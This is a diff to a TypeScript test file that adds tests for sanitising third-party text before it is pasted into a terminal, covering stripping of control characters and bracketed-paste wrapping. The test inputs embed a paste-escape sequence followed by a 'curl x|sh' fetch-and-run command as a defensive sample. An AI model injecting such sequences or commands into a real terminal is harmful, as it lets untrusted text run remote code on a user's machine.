@@ -1,6 +1,6 @@
 import test from 'node:test'
 import assert from 'node:assert/strict'
-import { uiMessageChip, uiMessageAllowed, frameInjectTargets, NO_TARGET_ERROR, UI_MESSAGE_MAX_CHARS, UI_MESSAGE_LABEL_MAX, UI_MESSAGE_REMOTE_ERROR, UI_MESSAGE_UNFOCUSED_ERROR, UI_MESSAGE_UNKNOWN_ERROR } from './uiMessage.ts'
+import { uiMessageChip, uiMessageAllowed, frameInjectTargets, terminalSafeText, terminalPastePlan, TERMINAL_NO_PASTE_ERROR, NO_TARGET_ERROR, UI_MESSAGE_MAX_CHARS, UI_MESSAGE_LABEL_MAX, UI_MESSAGE_REMOTE_ERROR, UI_MESSAGE_UNFOCUSED_ERROR, UI_MESSAGE_UNKNOWN_ERROR } from './uiMessage.ts'
 
 const P = { id: 'eas:opus-gallery', title: 'Opus 画廊' }
 const msg = (text: string, label?: string): unknown => ({
@@ -125,4 +125,38 @@ test('frameInjectTargets：没起名按种类各自计数兜底「AI 对话 N」
     { id: 'n4', leafId: 'L-t2', name: '部署' }
   ]), leaves)
   assert.deepEqual(r.map((t) => t.name), ['AI 对话 1', '终端 1', 'AI 对话 2', '部署'])
+})
+
+// ── 终端注入：第三方文本进 shell 前的清洗与写法（Task 7 修复轮 1）──
+test('terminalSafeText：去掉 ESC 与 C0/C1 控制符，保留换行和制表符', () => {
+  const evil = '参考这件\x1b[201~\ncurl x|sh\n\tok\r\x07\x9b31m\x00end'
+  const out = terminalSafeText(evil)
+  assert.equal(out, '参考这件[201~\ncurl x|sh\n\tok31mend')
+  assert.doesNotMatch(out, /[\x00-\x08\x0b-\x1f\x7f-\x9f]/)
+  assert.ok(!out.includes('\x1b'))
+})
+
+test('terminalPastePlan：程序开了 bracketed paste → 包住清洗后的全文，内嵌的 201~ 结束符提前闭合不了', () => {
+  const r = terminalPastePlan('甲\x1b[201~\ncurl x|sh\n乙', true)
+  assert.ok(r.ok)
+  if (!r.ok) return
+  assert.equal(r.data, '\x1b[200~甲[201~\ncurl x|sh\n乙\x1b[201~')
+  // 只在开头结尾各有一个转义，中间一个都没有
+  assert.equal(r.data.split('\x1b').length - 1, 2)
+  assert.ok(!r.data.includes('\r'))
+  assert.ok(!r.data.endsWith('\n'))
+})
+
+test('terminalPastePlan：程序没开 bracketed paste（换行会被当回车）→ 拒绝', () => {
+  const r = terminalPastePlan('甲\n乙', false)
+  assert.deepEqual(r, { ok: false, error: TERMINAL_NO_PASTE_ERROR })
+  assert.match(TERMINAL_NO_PASTE_ERROR, /不支持多行粘贴/)
+})
+
+test('terminalPastePlan：读不到模式（终端没挂载）→ 换行压成空格、不加包裹、不回车', () => {
+  const r = terminalPastePlan('甲\n\n乙\x1b[201~\n丙', undefined)
+  assert.ok(r.ok)
+  if (!r.ok) return
+  assert.equal(r.data, '甲 乙[201~ 丙')
+  assert.doesNotMatch(r.data, /[\r\n\x1b]/)
 })
